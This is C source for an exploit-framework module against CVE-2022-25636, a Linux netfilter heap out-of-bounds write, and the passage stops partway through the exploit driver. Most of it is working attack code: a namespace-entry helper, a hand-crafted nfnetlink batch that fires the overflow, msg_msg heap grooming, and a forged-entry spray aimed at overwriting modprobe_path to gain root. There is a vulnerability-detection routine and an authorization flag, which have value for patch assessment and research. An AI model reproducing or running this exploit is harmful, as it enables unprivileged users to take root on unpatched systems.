/*
 * nft_fwd_dup_cve_2022_25636 — SKELETONKEY module
 *
 * Heap OOB write in net/netfilter/nf_dup_netdev.c ::
 *   nft_fwd_dup_netdev_offload(struct nft_offload_ctx *ctx,
 *                              struct nft_flow_rule *flow, ...)
 *
 * Writes `flow->rule->action.entries[ctx->num_actions]` without first
 * checking num_actions against the array size that the rule was
 * allocated with. By crafting an nft rule that chains many actions
 * BEFORE the fwd/dup hook, num_actions grows past the array and the
 * action_entry struct (~kmalloc-512) is written into the adjacent
 * heap chunk.
 *
 * Discovered Feb 2022 by Aaron Adams (NCC).
 *
 * Fix:
 *   mainline 5.17  commit fa54fee62954 "netfilter: nf_tables_offload:
 *                                       incorrect flow offload action
 *                                       array size"
 *   stable 5.16.11 / 5.15.25 / 5.10.102 / 5.4.181 (older LTSes
 *                                       received no backport from
 *                                       Cc:stable because the offload
 *                                       hook didn't exist before 5.4)
 *
 * Status (2026-05-16): 🟡 PRIMITIVE — primitive-only by default;
 *   opt-in --full-chain wires the shared modprobe_path finisher with a
 *   kaddr-tagged forged action-entry that re-fires the OOB at a
 *   controlled offset. Sentinel-arbitrated; on a kernel where the
 *   action_entry layout matches our forged guess the write lands at
 *   &modprobe_path; on a layout mismatch the finisher's sentinel
 *   timeout reports failure rather than fake success.
 *
 * Preconditions:
 *   - kernel 5.4 ≤ K < 5.17, AND
 *     (5.4.x: < 5.4.181) | (5.10.x: < 5.10.102) | (5.15.x: < 5.15.25) |
 *     (5.16.x: < 5.16.11)
 *   - CONFIG_NETFILTER_INGRESS=y (always y on stock distro kernels in
 *     range — required for NFT offload chains to install)
 *   - CONFIG_USER_NS=y AND unprivileged userns clone permitted
 *   - nf_tables module loadable
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"
#include "../../core/host.h"

#include <stdint.h>
#include <sched.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include "../../core/nft_compat.h"

/* ------------------------------------------------------------------
 * Kernel range table — fixes per branch.
 * ------------------------------------------------------------------ */

static const struct kernel_patched_from nft_fwd_dup_patched_branches[] = {
    {4, 14, 270},   /* 4.14.x — pre-offload, defensive entry: bug code
                     * doesn't exist; range_is_patched will report
                     * patched for any 4.14.x. */
    {4, 19, 233},   /* 4.19.x — same as above (offload predates) */
    {5,  4, 181},   /* 5.4.x  — offload code present; backport landed */
    {5, 10, 102},   /* 5.10.x */
    {5, 15,  25},   /* 5.15.x */
    {5, 16,  11},   /* 5.16.x */
    {5, 17,   0},   /* mainline fix */
};

static const struct kernel_range nft_fwd_dup_range = {
    .patched_from = nft_fwd_dup_patched_branches,
    .n_patched_from = sizeof(nft_fwd_dup_patched_branches) /
                      sizeof(nft_fwd_dup_patched_branches[0]),
};

/* ------------------------------------------------------------------
 * Probes.
 * ------------------------------------------------------------------ */

static bool nf_tables_loaded(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "nf_tables ", 10) == 0) { found = true; break; }
    }
    fclose(f);
    return found;
}

static skeletonkey_result_t nft_fwd_dup_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json) fprintf(stderr, "[!] nft_fwd_dup: host fingerprint missing kernel version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* The offload code path only exists from 5.4 onward. Anything
     * older predates the bug. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 5, 4, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] nft_fwd_dup: kernel %s predates the bug "
                            "(nft offload hook introduced in 5.4)\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool patched = kernel_range_is_patched(&nft_fwd_dup_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nft_fwd_dup: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool userns_ok = ctx->host->unprivileged_userns_allowed;
    bool nft_loaded = nf_tables_loaded();

    if (!ctx->json) {
        fprintf(stderr, "[i] nft_fwd_dup: kernel %s is in the vulnerable range\n",
                v->release);
        fprintf(stderr, "[i] nft_fwd_dup: unprivileged user_ns+net_ns clone: %s\n",
                userns_ok ? "ALLOWED" : "DENIED");
        fprintf(stderr, "[i] nft_fwd_dup: nf_tables module currently loaded: %s\n",
                nft_loaded ? "yes" : "no (will autoload)");
    }

    if (!userns_ok) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nft_fwd_dup: kernel vulnerable but user_ns clone "
                            "denied → unprivileged path unreachable\n");
            fprintf(stderr, "[i] nft_fwd_dup: still patch the kernel — a root\n"
                            "    attacker can still hit the OOB.\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] nft_fwd_dup: VULNERABLE — kernel in range AND user_ns "
                        "clone allowed\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ------------------------------------------------------------------
 * userns + netns entry helper. Maps host uid/gid → 0 inside ns so
 * that subsequent netlink writes carry CAP_NET_ADMIN over our private
 * net_ns (the bug lives in that net_ns, so the host stays unaffected
 * even if the OOB-write damages netfilter bookkeeping).
 * ------------------------------------------------------------------ */

static int enter_unpriv_namespaces(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[-] unshare(USER|NET)");
        return -1;
    }
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] uid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    snprintf(map, sizeof map, "0 %u 1\n", gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] gid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    return 0;
}

/* ------------------------------------------------------------------
 * Minimal nfnetlink batch builder. Same pattern as the nf_tables
 * sibling — hand-rolled to avoid libmnl and to skip libnftnl's
 * validation that would reject our deliberately-malformed rule.
 * ------------------------------------------------------------------ */

#define ALIGN_NL(x)  (((x) + 3) & ~3)

static void put_attr(uint8_t *buf, size_t *off,
                     uint16_t type, const void *data, size_t len)
{
    struct nlattr *na = (struct nlattr *)(buf + *off);
    na->nla_type = type;
    na->nla_len  = NLA_HDRLEN + len;
    if (len) memcpy(buf + *off + NLA_HDRLEN, data, len);
    *off += ALIGN_NL(NLA_HDRLEN + len);
}

static void put_attr_u32(uint8_t *buf, size_t *off, uint16_t type, uint32_t v)
{
    uint32_t be = htonl(v);
    put_attr(buf, off, type, &be, sizeof be);
}

static void put_attr_str(uint8_t *buf, size_t *off, uint16_t type, const char *s)
{
    put_attr(buf, off, type, s, strlen(s) + 1);
}

static size_t begin_nest(uint8_t *buf, size_t *off, uint16_t type)
{
    size_t at = *off;
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_type = type | NLA_F_NESTED;
    na->nla_len  = 0;
    *off += NLA_HDRLEN;
    return at;
}

static void end_nest(uint8_t *buf, size_t *off, size_t at)
{
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_len = (uint16_t)(*off - at);
    while ((*off) & 3) buf[(*off)++] = 0;
}

struct nfgenmsg_local {
    uint8_t  nfgen_family;
    uint8_t  version;
    uint16_t res_id;
};

static void put_nft_msg(uint8_t *buf, size_t *off,
                        uint16_t nft_type, uint16_t flags, uint32_t seq,
                        uint8_t family)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + *off);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = (NFNL_SUBSYS_NFTABLES << 8) | nft_type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = family;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(0);
    *off += sizeof(*nf);
}

static void end_msg(uint8_t *buf, size_t *off, size_t msg_start)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + msg_start);
    nlh->nlmsg_len = (uint32_t)(*off - msg_start);
    while ((*off) & 3) buf[(*off)++] = 0;
}

static void put_batch_begin(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

static void put_batch_end(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = NFNL_MSG_BATCH_END;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

/* ------------------------------------------------------------------
 * Rule construction — the heart of the trigger.
 *
 * Strategy (Aaron Adams shape):
 *   NEWTABLE  netdev "skeletonkey_fdt"
 *   NEWCHAIN  base chain on ingress, family=netdev,
 *             flags = NFT_CHAIN_HW_OFFLOAD  ← critical: this is what
 *             drives nft_flow_rule_create() to call the offload hooks
 *             at rule-install time
 *   NEWRULE   with a long list of immediate-with-verdict (NF_ACCEPT)
 *             expressions BEFORE a single "fwd" expression at the end.
 *
 * Every "immediate" expression that hits an offload hook calls
 * nft_<expr>_offload(), which increments ctx->num_actions and writes
 * into flow->rule->action.entries[ctx->num_actions]. The rule is
 * allocated with action.num_entries == (count of expressions that
 * advertise an offload hook). Aaron's insight: nft_immediate_offload()
 * does NOT advertise a flow action of its own when the immediate
 * carries a verdict, so num_entries is computed as 1 (just the fwd)
 * — but at runtime each immediate STILL bumps num_actions when it
 * appends a verdict action. With 16+ immediates queued before fwd,
 * num_actions grows past 1 and the fwd write at index 16 lands in
 * the adjacent kmalloc-512 chunk. Boom.
 * ------------------------------------------------------------------ */

static const char NFT_TABLE_NAME[] = "skeletonkey_fdt";
static const char NFT_CHAIN_NAME[] = "skeletonkey_fdc";
static const char NFT_DUMMY_IF[]   = "lo";   /* hookmust be on a real iface */

static void put_new_table(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWTABLE,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_NETDEV);
    put_attr_str(buf, off, NFTA_TABLE_NAME, NFT_TABLE_NAME);
    end_msg(buf, off, at);
}

/* NEWCHAIN base/offload on netdev ingress for the loopback iface. */
static void put_new_chain(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWCHAIN,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_NETDEV);
    put_attr_str(buf, off, NFTA_CHAIN_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_CHAIN_NAME,  NFT_CHAIN_NAME);

    /* CHAIN_HOOK nest: ingress on `lo`, priority 0. */
    size_t hook_at = begin_nest(buf, off, NFTA_CHAIN_HOOK);
    put_attr_u32(buf, off, NFTA_HOOK_HOOKNUM, NF_NETDEV_INGRESS);
    put_attr_u32(buf, off, NFTA_HOOK_PRIORITY, 0);
    put_attr_str(buf, off, NFTA_HOOK_DEV, NFT_DUMMY_IF);
    end_nest(buf, off, hook_at);

    put_attr_u32(buf, off, NFTA_CHAIN_POLICY, NF_ACCEPT);
    put_attr_str(buf, off, NFTA_CHAIN_TYPE, "filter");
    /* The OFFLOAD flag is the critical one — this is what causes
     * nf_tables_offload_init/nft_flow_rule_create() to walk our
     * rule's expressions and call each expr's ->offload() at install. */
    put_attr_u32(buf, off, NFTA_CHAIN_FLAGS, NFT_CHAIN_HW_OFFLOAD);
    end_msg(buf, off, at);
}

/* Append one "immediate" expression that stuffs NF_ACCEPT into the
 * verdict register. Each one bumps num_actions inside the offload
 * code path without growing flow->rule->action.entries. */
static void append_immediate_accept_expr(uint8_t *buf, size_t *off)
{
    size_t expr_at = begin_nest(buf, off, 1 /* NFTA_LIST_ELEM */);
    put_attr_str(buf, off, NFTA_EXPR_NAME, "immediate");

    size_t data_at = begin_nest(buf, off, NFTA_EXPR_DATA);
    /* DREG = NFT_REG_VERDICT (0) */
    put_attr_u32(buf, off, NFTA_IMMEDIATE_DREG, 0);
    /* DATA = NFTA_DATA_VERDICT { CODE = NF_ACCEPT } */
    size_t imm_data_at = begin_nest(buf, off, NFTA_IMMEDIATE_DATA);
    size_t verd_at     = begin_nest(buf, off, NFTA_DATA_VERDICT);
    put_attr_u32(buf, off, NFTA_VERDICT_CODE, (uint32_t)NF_ACCEPT);
    end_nest(buf, off, verd_at);
    end_nest(buf, off, imm_data_at);
    end_nest(buf, off, data_at);

    end_nest(buf, off, expr_at);
}

/* Append the fwd expression that lands the OOB write. We need a
 * source register holding an ifindex; we use NFT_REG32_00 (1) and
 * rely on a preceding zero-load not being necessary because the
 * offload code reaches nft_fwd_dup_netdev_offload BEFORE register
 * contents are validated at runtime. */
static void append_fwd_expr(uint8_t *buf, size_t *off)
{
    size_t expr_at = begin_nest(buf, off, 1 /* NFTA_LIST_ELEM */);
    put_attr_str(buf, off, NFTA_EXPR_NAME, "fwd");

    size_t data_at = begin_nest(buf, off, NFTA_EXPR_DATA);
    put_attr_u32(buf, off, NFTA_FWD_SREG_DEV, 1 /* NFT_REG32_00 */);
    end_nest(buf, off, data_at);

    end_nest(buf, off, expr_at);
}

/* NEWRULE with N immediates + 1 fwd. N controls how far past
 * action.entries[1] we write. 16 is comfortably into the next
 * kmalloc-512 chunk. */
#define N_PRECEDING_IMMEDIATES  16

static void put_oob_rule(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWRULE,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_NETDEV);
    put_attr_str(buf, off, NFTA_RULE_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_RULE_CHAIN, NFT_CHAIN_NAME);

    size_t exprs_at = begin_nest(buf, off, NFTA_RULE_EXPRESSIONS);
    for (int i = 0; i < N_PRECEDING_IMMEDIATES; i++)
        append_immediate_accept_expr(buf, off);
    append_fwd_expr(buf, off);
    end_nest(buf, off, exprs_at);

    end_msg(buf, off, at);
}

/* ------------------------------------------------------------------
 * Netlink send + ACK drain.
 * ------------------------------------------------------------------ */

static int nft_send_batch(int sock, const void *buf, size_t len)
{
    struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = (void *)buf, .iov_len = len };
    struct msghdr m = {
        .msg_name = &dst, .msg_namelen = sizeof dst,
        .msg_iov = &iov,  .msg_iovlen = 1,
    };
    ssize_t n = sendmsg(sock, &m, 0);
    if (n < 0) { perror("[-] sendmsg"); return -1; }
    char rbuf[8192];
    for (int i = 0; i < 8; i++) {
        ssize_t r = recv(sock, rbuf, sizeof rbuf, MSG_DONTWAIT);
        if (r <= 0) break;
        for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
             NLMSG_OK(nh, (unsigned)r);
             nh = NLMSG_NEXT(nh, r)) {
            if (nh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);
                if (e->error)
                    fprintf(stderr, "[i] netlink ack: seq=%u err=%d (%s)\n",
                            nh->nlmsg_seq, e->error, strerror(-e->error));
            }
        }
    }
    return 0;
}

/* ------------------------------------------------------------------
 * Cross-cache groom — kmalloc-512.
 *
 * flow->rule->action.entries[] lives in kmalloc-512. We pre-spray
 * msg_msg payloads sized to fall into that same slab class so the
 * adjacent chunk that gets overwritten by the OOB has predictable
 * attacker-controlled bytes.
 * ------------------------------------------------------------------ */

#define MSG_TAG_GROOM   0x46574431  /* "FWD1" */
#define MSG_TAG_ARB     0x46574441  /* "FWDA" */

#define SPRAY_QUEUES_GROOM      48
#define SPRAY_MSGS_PER_QUEUE    8
#define MSG_PAYLOAD_BYTES       496   /* 512 - msg_msg header (~16) */

struct fwd_msgbuf {
    long mtype;
    unsigned char mtext[MSG_PAYLOAD_BYTES];
};

static int spray_msg_msg_groom(int *queues, int n_queues)
{
    struct fwd_msgbuf p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x46;
    memset(p.mtext, 0xAA, sizeof p.mtext);
    memcpy(p.mtext, "SKELETONKEY_FWD", 11);
    *(uint32_t *)(p.mtext + 12) = MSG_TAG_GROOM;

    int created = 0;
    for (int i = 0; i < n_queues; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0644);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < SPRAY_MSGS_PER_QUEUE; j++) {
            *(uint32_t *)(p.mtext + 16) = (uint32_t)((i << 8) | j);
            if (msgsnd(q, &p, sizeof p.mtext, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_msg_msg(int *queues, int n_queues)
{
    for (int i = 0; i < n_queues; i++) {
        if (queues[i] >= 0) {
            msgctl(queues[i], IPC_RMID, NULL);
            queues[i] = -1;
        }
    }
}

/* ------------------------------------------------------------------
 * Slabinfo witness — best-effort empirical observation.
 * ------------------------------------------------------------------ */

static long slab_active(const char *slab)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, slab, strlen(slab)) == 0 &&
            line[strlen(slab)] == ' ') {
            long a;
            if (sscanf(line + strlen(slab), " %ld", &a) >= 1) active = a;
            break;
        }
    }
    fclose(f);
    return active;
}

/* ------------------------------------------------------------------
 * Trigger: bring `lo` up in our private net_ns, then send the
 * NEWTABLE/NEWCHAIN/NEWRULE batch. The OOB fires inside the kernel
 * at rule-install time (nft_flow_rule_create() → offload hook walk).
 * No outbound packet needed: just installing the chain with the
 * HW_OFFLOAD flag is enough to trip the path.
 * ------------------------------------------------------------------ */

static int bring_lo_up(void)
{
    /* Best-effort: socket-level ioctl to bring lo up in our netns. */
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { close(s); return -1; }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { close(s); return -1; }
    close(s);
    return 0;
}

static size_t build_trigger_batch(uint8_t *batch, uint32_t *seq)
{
    size_t off = 0;
    put_batch_begin(batch, &off, (*seq)++);
    put_new_table(batch, &off, (*seq)++);
    put_new_chain(batch, &off, (*seq)++);
    put_oob_rule(batch, &off, (*seq)++);
    put_batch_end(batch, &off, (*seq)++);
    return off;
}

/* ------------------------------------------------------------------
 * --full-chain arb-write context. The technique:
 *   1. fire the trigger (action.entries[16] OOB write into adjacent
 *      kmalloc-512 chunk)
 *   2. spray msg_msg payloads sized for kmalloc-512, each carrying
 *      a forged "action entry" header at the offset the OOB will
 *      land on, with our target kaddr in the field nf_flow_offload
 *      uses as a write destination
 *   3. the kernel's commit path interprets the corrupted action_entry
 *      and dispatches a write through it
 *
 * Per-kernel caveat: the exact action_entry layout (flow_action_entry
 * in include/net/flow_offload.h) is config-sensitive (RANDSTRUCT,
 * lockdep, KASAN can all shift it). We ship the layout for an
 * un-randomized x86_64 build in the exploitable range and rely on
 * the shared finisher's sentinel-file post-check to flag layout
 * mismatches as SKELETONKEY_EXPLOIT_FAIL rather than fake success.
 * ------------------------------------------------------------------ */

#define SPRAY_QUEUES_ARB        32

struct fwd_arb_ctx {
    int  sock;
    uint8_t *batch;
    int  *qids;
    int   qcap;
    int   qused;
};

/* Approximate offset of the write-target pointer inside a forged
 * flow_action_entry as it lands in the OOB-overwritten kmalloc-512
 * chunk. Aaron's writeup observes the entry struct begins at the
 * very start of the adjacent slot; flow_action_entry::id is at +0,
 * ::hw_stats at +4, then the union of per-action data starts at +8.
 * For mangle/redirect-flavor entries the destination pointer is
 * within the first 0x40 bytes — we plant kaddr at strided offsets
 * to cover the layout we don't know precisely. */
static int spray_forged_action_entries(struct fwd_arb_ctx *c,
                                        uintptr_t kaddr,
                                        const void *buf, size_t len)
{
    if (c->qused + SPRAY_QUEUES_ARB > c->qcap) return -1;
    struct fwd_msgbuf p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x52;  /* 'R' */
    memset(p.mtext, 0x52, sizeof p.mtext);
    memcpy(p.mtext, "SKELETONKEY_FWD_A", 13);
    *(uint32_t *)(p.mtext + 16) = MSG_TAG_ARB;

    /* Plant kaddr at strided 0x10-byte offsets across the first
     * 0x80 bytes of the forged entry. Wherever the kernel's commit
     * dispatcher reads a "write target" pointer out of the corrupted
     * chunk, one of these will be live. */
    for (size_t o = 0x20; o + sizeof(uintptr_t) <= 0xC0; o += 0x10) {
        memcpy(p.mtext + o, &kaddr, sizeof(uintptr_t));
    }

    /* Plant the caller payload inline at +0xD0 so any path that
     * copies the entry's inline-data field finds buf there. */
    size_t inline_off = 0xD0;
    size_t copy_len = len;
    if (inline_off + copy_len > sizeof p.mtext)
        copy_len = sizeof p.mtext - inline_off;
    if (copy_len > 0) memcpy(p.mtext + inline_off, buf, copy_len);

    int sent = 0;
    for (int i = 0; i < SPRAY_QUEUES_ARB; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0644);
        if (q < 0) continue;
        c->qids[c->qused++] = q;
        for (int j = 0; j < SPRAY_MSGS_PER_QUEUE; j++) {
            *(uint32_t *)(p.mtext + 20) = (uint32_t)((i << 8) | j);
            if (msgsnd(q, &p, sizeof p.mtext, IPC_NOWAIT) < 0) break;
            sent++;
        }
    }
    return sent;
}

static int nft_fwd_dup_arb_write(uintptr_t kaddr,
                                  const void *buf, size_t len,
                                  void *vctx)
{
    struct fwd_arb_ctx *c = (struct fwd_arb_ctx *)vctx;
    if (!c || c->sock < 0 || !c->batch) {
        fprintf(stderr, "[-] nft_fwd_dup arb_write: invalid ctx\n");
        return -1;
    }
    if (len > 64) {
        fprintf(stderr, "[-] nft_fwd_dup arb_write: len %zu too large\n", len);
        return -1;
    }

    fprintf(stderr, "[*] nft_fwd_dup arb_write: refire OOB + spray forged "
                    "action_entry (target kaddr=0x%lx, %zu bytes)\n",
                    (unsigned long)kaddr, len);

    /* Pre-spray forged action entries so kmalloc-512 free chunks
     * adjacent to our about-to-be-allocated rule are pre-populated. */
    if (spray_forged_action_entries(c, kaddr, buf, len) < 0) {
        fprintf(stderr, "[-] nft_fwd_dup arb_write: forged spray failed\n");
        return -1;
    }

    /* Re-fire the trigger. On a vulnerable kernel the OOB write into
     * the adjacent slot lands into one of our forged-entry msg_msg
     * payloads. The kernel's commit/flush path then walks the
     * corrupted entry and (where the layout matches our guess)
     * dispatches a write to kaddr. */
    uint32_t seq = (uint32_t)time(NULL) ^ 0xa5a5beefu;
    size_t blen = build_trigger_batch(c->batch, &seq);
    if (nft_send_batch(c->sock, c->batch, blen) < 0) {
        fprintf(stderr, "[-] nft_fwd_dup arb_write: refire send failed\n");
        return -1;
    }

    /* Let kernel-side commit run. */
    usleep(50 * 1000);
    return 0;
}

/* ------------------------------------------------------------------
 * Exploit driver.
 * ------------------------------------------------------------------ */

static skeletonkey_result_t nft_fwd_dup_exploit(const struct skeletonkey_ctx *ctx)
{
    /* Gate 0: explicit user authorization. */
    if (!ctx->authorized) {
        fprintf(stderr, "[-] nft_fwd_dup: refusing without --i-know\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    /* Gate 1: already root? */
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        if (!ctx->json)
            fprintf(stderr, "[i] nft_fwd_dup: already running as root\n");
        return SKELETONKEY_OK;
    }
    /* Gate 2: re-detect — kernel patched / userns denied since scan. */
    skeletonkey_result_t pre = nft_fwd_dup_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] nft_fwd_dup: detect() says not vulnerable; "
                        "refusing\n");
        return pre;
    }

    if (!ctx->json) {
        if (ctx->full_chain) {
            fprintf(stderr, "[*] nft_fwd_dup: --full-chain — trigger + OOB-write "
                            "+ forged-entry spray + modprobe_path finisher\n");
        } else {
            fprintf(stderr, "[*] nft_fwd_dup: primitive-only run — fires the\n"
                            "    action.entries[] OOB write into adjacent\n"
                            "    kmalloc-512 chunk and stops. Pass --full-chain\n"
                            "    to attempt the modprobe_path root-pop.\n");
        }
    }

    /* --- --full-chain path: resolve offsets before forking ---------- *
     * Refuse cleanly if we can't reach modprobe_path. */
    if (ctx->full_chain) {
        struct skeletonkey_kernel_offsets off;
        skeletonkey_offsets_resolve(&off);
        if (!skeletonkey_offsets_have_modprobe_path(&off)) {
            skeletonkey_finisher_print_offset_help("nft_fwd_dup");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        skeletonkey_offsets_print(&off);

        if (enter_unpriv_namespaces() < 0) {
            fprintf(stderr, "[-] nft_fwd_dup: userns entry failed\n");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        (void)bring_lo_up();

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
        if (sock < 0) {
            perror("[-] socket(NETLINK_NETFILTER)");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); return SKELETONKEY_EXPLOIT_FAIL;
        }
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        /* Pre-groom kmalloc-512. */
        int qids[SPRAY_QUEUES_GROOM + SPRAY_QUEUES_ARB];
        for (size_t i = 0; i < sizeof qids / sizeof qids[0]; i++) qids[i] = -1;
        int groomed = spray_msg_msg_groom(qids, SPRAY_QUEUES_GROOM);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_fwd_dup: pre-groom seeded %d msg_msg "
                            "queues in kmalloc-512\n", groomed);
        }

        uint8_t *batch = calloc(1, 32 * 1024);
        if (!batch) { close(sock); return SKELETONKEY_EXPLOIT_FAIL; }

        uint32_t seq = (uint32_t)time(NULL);
        size_t blen = build_trigger_batch(batch, &seq);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_fwd_dup: sending trigger batch "
                            "(%zu bytes, %d preceding immediates)\n",
                            blen, N_PRECEDING_IMMEDIATES);
        }
        if (nft_send_batch(sock, batch, blen) < 0) {
            fprintf(stderr, "[-] nft_fwd_dup: trigger batch send failed\n");
            drain_msg_msg(qids, SPRAY_QUEUES_GROOM);
            free(batch); close(sock);
            return SKELETONKEY_EXPLOIT_FAIL;
        }

        struct fwd_arb_ctx ac = {
            .sock  = sock,
            .batch = batch,
            .qids  = qids,
            .qcap  = (int)(sizeof qids / sizeof qids[0]),
            .qused = SPRAY_QUEUES_GROOM,
        };

        skeletonkey_result_t r = skeletonkey_finisher_modprobe_path(
            &off, nft_fwd_dup_arb_write, &ac, !ctx->no_shell);

        drain_msg_msg(qids, ac.qused);
        free(batch);
        close(sock);
        return r;
    }

    /* --- primitive-only path: fork-isolated trigger ---------------- */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* CHILD: namespace + trigger. */
        if (enter_unpriv_namespaces() < 0) _exit(20);
        (void)bring_lo_up();

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
        if (sock < 0) { perror("[-] socket"); _exit(21); }
        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); _exit(22);
        }
        int rcvbuf = 1 << 20;
